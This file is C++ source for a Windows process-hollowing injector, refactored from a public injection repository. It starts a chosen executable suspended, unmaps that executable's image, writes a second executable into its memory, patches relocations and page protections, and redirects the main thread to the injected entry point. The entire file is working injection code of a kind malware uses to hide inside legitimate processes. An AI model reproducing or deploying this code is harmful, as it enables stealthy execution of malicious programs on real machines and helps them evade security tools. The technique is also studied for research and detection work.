//refactoring from: https://github.com/theevilbit/injection/tree/master/ProcessHollowing

#include <iostream>
#include <cstdio>
#include <windows.h>
#include <tlhelp32.h>
#include <strsafe.h>

#define MAX_ARGS 3
#define DEBUG 1

typedef NTSTATUS(WINAPI* prototype_NtUnmapViewOfSection)(
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
	);

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;

} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

LPSTARTUPINFOA hwStartupInfo = new STARTUPINFOA();
LPPROCESS_INFORMATION hwProcessInfo = new PROCESS_INFORMATION();

PIMAGE_DOS_HEADER injDosHeader;
PIMAGE_NT_HEADERS injNTHeader;
PIMAGE_SECTION_HEADER injSectionHeader;

HANDLE injFile;
DWORD injFileSize;
PVOID injFileBuffer;
LPVOID hwProcessImageBase;

void displayOptions() 
{
	printf("Hollow Process: <Exe To Hollow> <Exe To Inject>\n\r");
}

DWORD countRelocationEnteries(DWORD blockSize) 
{
	return (blockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
}

bool getFunctionAddressByDll(char* pszDllName, char* pszFunctionName, PVOID* ppvFunctionAddress)
{
	HMODULE hModule = NULL;
	PVOID	pvFunctionAddress = NULL;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		return false;
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == pvFunctionAddress)
	{
		return false;
	}

	*ppvFunctionAddress = pvFunctionAddress;
	return true;
}

LPCONTEXT getProcessThreadContext() {
	LPCONTEXT hwContext = new CONTEXT();
	hwContext->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(hwProcessInfo->hThread, hwContext);
	return hwContext;
}

LPVOID getHollowBaseAddress(LPCONTEXT hwContext) {

	LPVOID injBaseAddress;
#ifdef _WIN64
	if (injNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
	{
		return NULL;
	}
	ReadProcessMemory(hwProcessInfo->hProcess, (PVOID)(hwContext->Rdx + (sizeof(SIZE_T) * 2)), &injBaseAddress, sizeof(injBaseAddress), NULL);
#endif

#ifdef _X86_
	if (injNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		return NULL;
	}
	ReadProcessMemory(hwProcessInfo->hProcess, (PVOID)(hwContext->Ebx + 8), &injBaseAddress, sizeof(injBaseAddress), NULL);
#endif

	return injBaseAddress;

}

LPVOID getRelocationBaseAddress(LPVOID hwBaseAddress) {

	LPVOID relocationBaseAddress = NULL;
	IMAGE_DATA_DIRECTORY relocData = injNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	prototype_NtUnmapViewOfSection sectionView = NULL;
	getFunctionAddressByDll((char*)"ntdll.dll", (char*)"NtUnmapViewOfSection", (PVOID*)&sectionView);

	if (!(injNTHeader->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) && relocData.VirtualAddress != 0 && relocData.Size != 0)
	{
		if (!sectionView(hwProcessInfo->hProcess, hwBaseAddress))
		{
			relocationBaseAddress = VirtualAllocEx(hwProcessInfo->hProcess, hwBaseAddress, injNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (!relocationBaseAddress)
			{
				return NULL;
			}
		}
		else {
			relocationBaseAddress = VirtualAllocEx(hwProcessInfo->hProcess, NULL, injNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (!relocationBaseAddress)
			{
				return NULL;
			}
		}
	}
	else {

		relocationBaseAddress = VirtualAllocEx(hwProcessInfo->hProcess, (PVOID)(injNTHeader->OptionalHeader.ImageBase), injNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (!sectionView(hwProcessInfo->hProcess, (PVOID)(injNTHeader->OptionalHeader.ImageBase)))
		{
			// Allocate memory for the executable image
			relocationBaseAddress = VirtualAllocEx(hwProcessInfo->hProcess, (PVOID)(injNTHeader->OptionalHeader.ImageBase), injNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

			if (!relocationBaseAddress)
			{
				return NULL;
			}

		}
		else
		{
			return NULL;
		}
	}

	return relocationBaseAddress;

}

bool writeSectionToHollow(LPVOID hwRelocationBaseAddress) 
{

	for (int i = 0; i < injNTHeader->FileHeader.NumberOfSections; i++)
	{
		injSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)injFileBuffer + injDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		printf("[*] Writing %s to 0x%Ix\r\n", injSectionHeader->Name, (SIZE_T)((LPBYTE)hwRelocationBaseAddress + injSectionHeader->VirtualAddress));
		if (!WriteProcessMemory(hwProcessInfo->hProcess, (PVOID)((LPBYTE)hwRelocationBaseAddress + injSectionHeader->VirtualAddress), (PVOID)((LPBYTE)injFileBuffer + injSectionHeader->PointerToRawData), injSectionHeader->SizeOfRawData, NULL))
		{
			return false;
		}
	}

	return true;
}

bool reloactionVirtualAddresses(SIZE_T relocationDelta, LPVOID hwRelocationBaseAddress) 
{

	if (relocationDelta != 0) //only if needed
	{
		for (int x = 0; x < injNTHeader->FileHeader.NumberOfSections; x++)
		{
			const char* pSectionName = ".reloc";
			injSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)injFileBuffer + injDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (x * sizeof(IMAGE_SECTION_HEADER)));
			if (memcmp(injSectionHeader->Name, pSectionName, strlen(pSectionName)))
				continue;

			DWORD dwRelocSectionRawData = injSectionHeader->PointerToRawData;
			DWORD dwOffsetInRelocSection = 0;

			IMAGE_DATA_DIRECTORY relocData = injNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			
			while (dwOffsetInRelocSection < relocData.Size)
			{
				printf("%d\n\r", dwOffsetInRelocSection);

				PBASE_RELOCATION_BLOCK injBlockheader = (PBASE_RELOCATION_BLOCK)((SIZE_T)injFileBuffer + dwRelocSectionRawData + dwOffsetInRelocSection);
				dwOffsetInRelocSection += sizeof(BASE_RELOCATION_BLOCK);

				DWORD injEntryCount = countRelocationEnteries(injBlockheader->BlockSize);
				PBASE_RELOCATION_ENTRY blocks = (PBASE_RELOCATION_ENTRY)((SIZE_T)injFileBuffer + dwRelocSectionRawData + dwOffsetInRelocSection);

				for (DWORD y = 0; y < injEntryCount; y++)
				{
					dwOffsetInRelocSection += sizeof(BASE_RELOCATION_ENTRY);

					if (blocks[y].Type == 0)
						continue;

					SIZE_T filedAddress = injBlockheader->PageAddress + blocks[y].Offset;

					SIZE_T buffer = 0;

					if (!ReadProcessMemory(hwProcessInfo->hProcess, (PVOID)((SIZE_T)hwRelocationBaseAddress + filedAddress), &buffer, sizeof(SIZE_T), 0))
					{
						return false;
					}

					buffer += relocationDelta;

					if (!WriteProcessMemory(hwProcessInfo->hProcess, (PVOID)((SIZE_T)hwRelocationBaseAddress + filedAddress), &buffer, sizeof(SIZE_T), NULL))
					{
						return false;
					}
				}
			}
		}
	}

	return true;
}

bool restoreMemoryPages(LPVOID hwRelocationBaseAddress) 
{

	DWORD oldProtection = 0;
	if (!VirtualProtectEx(hwProcessInfo->hProcess, hwRelocationBaseAddress, injNTHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtection))
	{
		return false;
	}

	for (int i = 0; i < injNTHeader->FileHeader.NumberOfSections; i++)
	{
		injSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)injFileBuffer + injDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		DWORD protectFlag = 0;

		if ((injSectionHeader->Characteristics) & IMAGE_SCN_MEM_EXECUTE) //executable
		{
			if ((injSectionHeader->Characteristics) & IMAGE_SCN_MEM_READ) //executable, readable
			{
				if ((injSectionHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) //executable, readable, writeable
				{
					protectFlag = PAGE_EXECUTE_READWRITE;
				}
				else //executable, readable, not writeable
				{
					protectFlag = PAGE_EXECUTE_READ;
				}
			}
			else
			{
				if ((injSectionHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) // executable, not readable,  writable
				{
					protectFlag = PAGE_EXECUTE_WRITECOPY;
				}
				else // executable, not readable, not writable
				{
					protectFlag = PAGE_EXECUTE;
				}
			}
		}
		else
		{
			if ((injSectionHeader->Characteristics) & IMAGE_SCN_MEM_READ) //not executable, readable
			{
				if ((injSectionHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) //not executable, readable, writeable
				{
					protectFlag = PAGE_READWRITE;
				}
				else //not executable, readable, not writeable
				{
					protectFlag = PAGE_READONLY;
				}

			}
			else {
				if ((injSectionHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) {
					protectFlag = PAGE_WRITECOPY;
				}
				else {
					protectFlag = PAGE_NOACCESS;
				}
			}
		}

		if ((injSectionHeader->Characteristics) & IMAGE_SCN_MEM_NOT_CACHED)
		{
			protectFlag |= PAGE_NOCACHE;
		}

		VirtualProtectEx(hwProcessInfo->hProcess, (PVOID)((LPBYTE)hwRelocationBaseAddress + injSectionHeader->VirtualAddress), injSectionHeader->SizeOfRawData, protectFlag, &oldProtection);
	}

	return true;
}

bool setNewEntryPoint(LPVOID hwRelocationBaseAddress, LPCONTEXT hwContext) 
{
#ifdef _WIN64
	hwContext->Rcx = (SIZE_T)((LPBYTE)hwRelocationBaseAddress + injNTHeader->OptionalHeader.AddressOfEntryPoint);
	if (!WriteProcessMemory(hwProcessInfo->hProcess, (PVOID)(hwContext->Rdx + (sizeof(SIZE_T) * 2)), &hwRelocationBaseAddress, sizeof(hwRelocationBaseAddress), NULL))
	{
		return false;
	}

	return true;

#endif

#ifdef _X86_
	hwContext->Eax = (SIZE_T)((LPBYTE)hwRelocationBaseAddress + injNTHeader->OptionalHeader.AddressOfEntryPoint);
	if (!WriteProcessMemory(hwProcessInfo->hProcess, (PVOID)(hwContext->Ebx + 8), &hwRelocationBaseAddress, sizeof(hwRelocationBaseAddress), NULL))
	{
		return false;
	}

	return true;
#endif	
}

void terminateHollow(const char* msg, int code) {
	TerminateProcess(hwProcessInfo->hProcess, -1);
#ifdef DEBUG
	printf("%s\n\r", msg);
#endif // DEBUG
	exit(code);
}

void main(int argc, char* argv[])
{
	if (argc != MAX_ARGS) {
		displayOptions();
		return;
	}

	CreateProcessA(0, argv[1], 0, 0, 0, CREATE_SUSPENDED, 0, 0, hwStartupInfo, hwProcessInfo);

	if (!hwProcessInfo->hProcess)
	{
		terminateHollow("Unable to create Process...", -1);
	}

	injFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (injFile == INVALID_HANDLE_VALUE)
	{
		terminateHollow("Unable to open injection...", -1);
	}

	injFileSize = GetFileSize(injFile, NULL);

	injFileBuffer = VirtualAlloc(NULL, injFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!ReadFile(injFile, injFileBuffer, injFileSize, 0, NULL))
	{
		terminateHollow("Unable to read injection...", -1);
	}

	CloseHandle(injFile);

	injDosHeader = (PIMAGE_DOS_HEADER)injFileBuffer;

	if (injDosHeader->e_magic != IMAGE_DOS_SIGNATURE) //IMAGE_DOS_SIGNATURE = MZ
	{
		terminateHollow("Unable to read injection dos header...", -1);
	}

	injNTHeader = (PIMAGE_NT_HEADERS)((LPBYTE)injFileBuffer + injDosHeader->e_lfanew);
	LPCONTEXT hwContext = getProcessThreadContext();

	LPVOID hwBaseAddress = getHollowBaseAddress(hwContext);
	if (hwBaseAddress == NULL) 
	{
		terminateHollow("Unable to get hollow process base address...", -1);
	}

	LPVOID hwRelocationBaseAddress = getRelocationBaseAddress(hwBaseAddress);
	if (hwRelocationBaseAddress == NULL)
	{
		terminateHollow("Unable to new relocation address in hollow process...", -1);
	}

	SIZE_T relocationDelta = (SIZE_T)hwRelocationBaseAddress - injNTHeader->OptionalHeader.ImageBase;
	injNTHeader->OptionalHeader.ImageBase = (SIZE_T)hwRelocationBaseAddress;

	if (!WriteProcessMemory(hwProcessInfo->hProcess, hwRelocationBaseAddress, injFileBuffer, injNTHeader->OptionalHeader.SizeOfHeaders, NULL))
	{
		terminateHollow("Unable to set new relocation address in hollow process...", -1);
	}

	if (!writeSectionToHollow(hwRelocationBaseAddress)) 
	{
		terminateHollow("Unable to write sections in new relocation address in hollow process...", -1);
	}

	if (!reloactionVirtualAddresses(relocationDelta, hwRelocationBaseAddress)) 
	{
		terminateHollow("Unable to relocate virtual addresses in hollow process...", -1);
	}

	if (!restoreMemoryPages(hwRelocationBaseAddress)) 
	{
		terminateHollow("Unable to restore  memory address pages in hollow process...", -1);
	}

	if (!setNewEntryPoint(hwRelocationBaseAddress, hwContext))
	{
		terminateHollow("Unable to set new entry point in hollow process...", -1);
	}

	if (!SetThreadContext(hwProcessInfo->hThread, hwContext))
	{
		terminateHollow("Unable to change thread context in hollow process...", -1);
	}

	ResumeThread(hwProcessInfo->hThread);
}
